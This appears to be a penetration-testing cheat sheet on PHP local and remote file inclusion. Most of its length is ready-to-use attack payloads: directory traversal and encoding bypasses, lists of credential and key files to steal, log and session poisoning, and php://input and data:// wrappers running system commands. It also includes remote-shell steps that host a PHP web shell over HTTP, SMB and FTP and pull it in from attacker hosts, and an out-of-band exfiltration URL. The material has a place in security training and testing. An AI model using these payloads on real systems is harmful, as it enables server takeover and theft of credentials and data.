### Local/Remote File Inclusion (LFI/RFI)

**File Inclusion vulnerabilities** allow attackers to include files on a server through the web browser. This can lead to sensitive information disclosure, remote code execution, or cross-site scripting. Local File Inclusion (LFI) allows inclusion of local files, while Remote File Inclusion (RFI) allows inclusion of remote files from external servers.

* **Vulnerable Functions:** Functions like `include()`, `require()` in PHP that process user-supplied file paths without validation.
* **Common Targets:** Web applications that dynamically include pages, templates, or configuration files based on URL parameters.
* **Impact:** File disclosure, source code leakage, remote code execution, and server compromise.
* **Root Cause:** Lack of proper input validation and sanitization of user-controlled file paths.

-----

### Basic LFI/RFI Payloads and Impact

The most common file inclusion attacks involve manipulating file path parameters to traverse directories or include remote files.

#### Reading Local Files (LFI)

```
vulnerable.php?page=../../../etc/passwd
```

* **Why it's used:** To confirm vulnerability and extract sensitive system files like `/etc/passwd` or configuration files.
* **How it works:** The attacker uses directory traversal sequences (`../`) to navigate out of the webroot and access restricted system files.

#### Remote File Inclusion (RFI)

```
vulnerable.php?page=http://attacker.com/shell.txt
```

* **Why it's used:** To execute arbitrary code on the vulnerable server by including malicious files from external servers.
* **How it works:** When `allow_url_include` is enabled in PHP, the server fetches and executes remote files as if they were local.

#### Directory Traversal Techniques

```
?file=....//....//etc/passwd
?include=/etc/passwd
```

* **Why it's used:** To bypass simple filtering mechanisms and access files outside the intended directory.
* **How it works:** Different encoding and traversal patterns exploit how the application processes file paths.

-----

### Reading Sensitive Files - Complete List

#### Linux System Files

```bash
# User and authentication
/etc/passwd           # User accounts
/etc/shadow           # Password hashes (requires root)
/etc/group            # Group information
/etc/sudoers          # Sudo permissions
/etc/security/opasswd # Old passwords

# Network configuration
/etc/hosts              # Hostname mappings
/etc/resolv.conf        # DNS configuration
/etc/network/interfaces # Network interfaces
/etc/ssh/sshd_config    # SSH server config

# Service configurations
/etc/apache2/apache2.conf         # Apache
/etc/nginx/nginx.conf             # Nginx
/etc/mysql/my.cnf                 # MySQL
/etc/postgresql/*/postgresql.conf # PostgreSQL
```

#### Application Files

```bash
# Web application configs
/var/www/html/config.php
/var/www/html/.env
/var/www/html/.htaccess
/var/www/html/wp-config.php # WordPress

# Framework files
/var/www/html/app/config/database.php # Laravel
/var/www/html/config/database.yml     # Rails
/var/www/html/application.properties  # Spring

# Source code
/var/www/html/index.php
/var/www/html/admin.php
/var/www/html/includes/functions.php
```

#### User Data and Credentials

```bash
# SSH keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/*/.ssh/id_rsa

# Shell history
/root/.bash_history
/home/*/.bash_history
/root/.zsh_history

# AWS/Docker credentials
/root/.aws/credentials
/root/.docker/config.json
/home/*/.aws/credentials
```

#### Process Information (Current)

```bash
/proc/self/environ   # Environment variables
/proc/self/cmdline   # Command and arguments
/proc/self/stat      # Process status
/proc/self/status    # Detailed status
/proc/self/fd/[0-9]* # Open file descriptors
/proc/self/cwd       # Current working directory
/proc/self/exe       # Path to executable
```

#### System-wide Information

```bash
/proc/version      # Kernel version
/proc/cpuinfo      # CPU information
/proc/meminfo      # Memory usage
/proc/mounts       # Mounted filesystems
/proc/net/tcp      # TCP connections
/proc/net/udp      # UDP connections
/proc/net/arp      # ARP table
/proc/net/route    # Routing table
/proc/net/fib_trie # FIB trie (advanced routing)
```

#### Other Processes (if readable)

```bash
# Find interesting PIDs
/proc/[1-9]*/cmdline # Process commands
/proc/[1-9]*/environ # Process environment
/proc/[1-9]*/cwd     # Process working directory

# Example: Find MySQL process
grep -l "mysql" /proc/[1-9]*/cmdline 2>/dev/null
```

#### Identify Log Locations

```bash
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log
/var/log/vsftpd.log
```

-----

### File Inclusion in Different Contexts

File inclusion vulnerabilities can appear in various contexts beyond simple page parameters, including file uploads, log files, and session data.

#### Log File Poisoning

```http
vulnerable.php?page=/var/log/apache2/access.log&cmd=id

GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

* **Why it's used:** When direct file inclusion is filtered but log files can be accessed and contain executable code.
* **How it works:** The attacker injects PHP code into HTTP headers (User-Agent, Referer) that gets logged, then includes the log file to execute the code.

#### PHP Wrapper Exploitation

```
vulnerable.php?page=php://filter/convert.base64-encode/resource=index.php
```

* **Why it's used:** To read source code or binary files that would otherwise cause execution or display issues.
* **How it works:** PHP wrappers like `php://filter` allow reading files with various encodings, bypassing some execution contexts.

#### Session File Inclusion

```
vulnerable.php?page=/tmp/sess_[SESSION_ID]
```

* **Why it's used:** When session files store user-controlled data that can include executable code.
* **How it works:** The attacker sets a session variable with malicious code, then includes the session file to execute it.

-----

### Blind File Inclusion and Data Exfiltration

Blind file inclusion occurs when file content is included but not displayed directly in the response, requiring creative exfiltration techniques.

#### Error-Based Exfiltration

```http
vulnerable.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

* **Why it's used:** When file content isn't displayed but errors might reveal encoded data.
* **How it works:** Base64-encoded content might appear in error messages or page source when inclusion causes parsing issues.

#### Time-Based Detection

```http
vulnerable.php?page=http://attacker.com/slow.txt
```

* **Why it's used:** To confirm RFI when no direct output is available.
* **How it works:** A remote file with delayed response confirms successful inclusion based on increased response time.

#### Out-of-Band Exfiltration

```http
vulnerable.php?page=http://attacker.com/collect.php?data=CONTENT
```

* **Why it's used:** When all direct output methods are blocked.
* **How it works:** The included remote file sends collected data back to the attacker's server.

-----

### Advanced Protocol and Wrapper Techniques

Attackers leverage various PHP wrappers and protocols to extend file inclusion capabilities beyond simple file reading.

#### PHP Filter Wrappers

```
vulnerable.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

* **Why it's used:** To safely read files containing special characters that would break HTML/XML parsing.
* **How it works:** The filter encodes file content before inclusion, preventing parsing errors while maintaining data integrity.

#### Data URI Scheme

```
vulnerable.php?page=data://text/plain,<?php system('id'); ?>
```

* **Why it's used:** For direct code execution when remote file inclusion is blocked.
* **How it works:** The data URI scheme allows embedding executable code directly in the parameter.

#### ZIP/PHAR Wrappers

```
vulnerable.php?page=zip://archive.zip%23shell.php
vulnerable.php?page=phar://archive.phar/shell.php
```

* **Why it's used:** To bypass file upload restrictions and execute code from archives.
* **How it works:** These wrappers allow including files from within archive files, useful when direct file upload is restricted.

-----

### Detection and Exploitation Tools

Security testers use various tools to identify and exploit file inclusion vulnerabilities efficiently.

#### Automated Scanners

* **Why it's used:** To quickly identify vulnerable parameters and test multiple payloads.
* **How it works:** Tools like Burp Suite, OWASP ZAP, and Nuclei automate the process of sending traversal payloads and analyzing responses.

#### Custom Fuzzing Scripts

```python
import requests

payloads = ['../../../etc/passwd', '....//....//etc/passwd']
for payload in payloads:
    r = requests.get(f'http://target.com/?page={payload}')
    if 'root:' in r.text:
        print(f'Vulnerable with {payload}')
```

* **Why it's used:** For targeted testing of specific applications or parameters.
* **How it works:** Custom scripts allow fine-tuned payload delivery and response analysis.

#### Directory Traversal Tools

```
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k root
```

* **Why it's used:** Specialized tools for comprehensive directory traversal testing.
* **How it works:** These tools generate various traversal payloads and automatically detect successful file access.

-----

### Advanced Bypass Techniques

When basic file inclusion is blocked, attackers employ various bypass techniques to evade filters and restrictions.

#### Encoding Bypasses

```
..%252f..%252fetc%252fpasswd
..%c0%af..%c0%afetc%c0%afpasswd
```

* **Why it's used:** To bypass WAFs and input filters that check for specific strings.
* **How it works:** Double encoding, Unicode encoding, and other transformations evade simple string matching.

#### Null Byte Injection

```
vulnerable.php?page=../../../etc/passwd%00
```

* **Why it's used:** To truncate file extensions appended by the application.
* **How it works:** Null bytes terminate strings in C-based languages, removing added extensions like `.php`.

#### Path Truncation

```
vulnerable.php?page=../../../etc/passwd............
vulnerable.php?page=../../../etc/passwd?.php
```

* **Why it's used:** When null bytes don't work but path length limitations exist.
* **How it works:** Excessive characters or query parameters can cause extension truncation.

-----

### Source Code Disclosure Techniques

Reading application source code is often the first step in understanding and exploiting the application further.

#### PHP Filter Chain Encoding

```
vulnerable.php?page=php://filter/convert.base64-encode/resource=config.php
```

* **Why it's used:** To safely read PHP files that would execute if included directly.
* **How it works:** Base64 encoding prevents PHP execution while preserving file content.

#### Multiple Encoding Layers

```
vulnerable.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=index.php
```

* **Why it's used:** When simple base64 encoding is detected and blocked.
* **How it works:** Additional encoding layers bypass simple detection of common payloads.

#### Character Set Conversion

```
vulnerable.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=config.php
```

* **Why it's used:** To transform file content in ways that evade detection.
* **How it works:** Character set conversion can bypass filters looking for specific patterns.

-----

### Remote Code Execution (RCE) through LFI (RFI)

File inclusion vulnerabilities often lead to remote code execution, providing full server control.

#### Log Poisoning RCE

```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
```

* **Why it's used:** When direct file upload or inclusion isn't possible.
* **How it works:** Poisoning log files with PHP code, then including those logs to execute the code.

#### PHP Input Wrapper

```http
POST /?page=php://input HTTP/1.1

<?php system('id'); ?>


# Curl command to execute the code
curl -s -X POST 'http://example.com/index.php?language=php://input' -d '<?php system($_REQUEST["cmd"]); ?>&cmd=id'
```

#### HTTP/FTP Wrapper for Remote Shell

1. Host a `shell.php` file on a web server you control (e.g., http://your-server/shell.php):

```php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

2. Then include and execute it using HTTP/FTP wrapper:

```http
GET /vulnerable.php?page=http://<attacker-ip>/shell.php&cmd=id HTTP/1.1

GET /vulnerable.php?page=ftp://<attacker-ip>/shell.php&cmd=id HTTP/1.1

# Using curl to test
curl 'http://victim.com/vulnerable.php?page=http://<attacker-ip>/shell.php&cmd=id'
```

* **Why it's used:** For direct code execution without file upload.
* **How it works:** The HTTP/FTP wrapper reads remote file content as PHP code, allowing code execution.

#### Session File Injection

```http
GET /?param=<?php system('id'); ?> HTTP/1.1
Cookie: PHPSESSID=injected
```

* **Why it's used:** When session storage is predictable and accessible.
* **How it works:** Injecting code into session variables, then including the session file.

#### SMB Share for Remote Shell

* Set up an SMB server to host your shell:

```bash
impacket-smbserver -smb2support share $(pwd)

# Create shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

* Include and execute the shell using SMB:

```http
GET /index.php?language=\\10.10.15.90\share\shell.php&cmd=id
```

#### HTTP Server for Remote Shell

* Host the shell using Python's built-in HTTP server:

```bash
# Create shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php

# Start HTTP server
python3 -m http.server 8000
```

* Include and execute the shell:

```http
GET /index.php?language=http://10.10.15.90:8000/shell.php&cmd=id
```

#### FTP Server for Remote Shell

* Host the shell using Python's pyftpdlib:

```bash
# Install pyftpdlib
pip3 install pyftpdlib

# Create shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php

# Start FTP server
python3 -m pyftpdlib -p 21 -w
```

* Include and execute the shell:

```http
GET /index.php?language=ftp://10.10.15.90/shell.php&cmd=id
```

* **Important Notes:**
  * SMB and FTP servers may be blocked by firewalls
  * HTTP is more likely to work through firewalls
  * Use port 80/443 for HTTP/HTTPS when possible
  * URL-encode special characters if needed

-----

**Made with love by VIsh0k**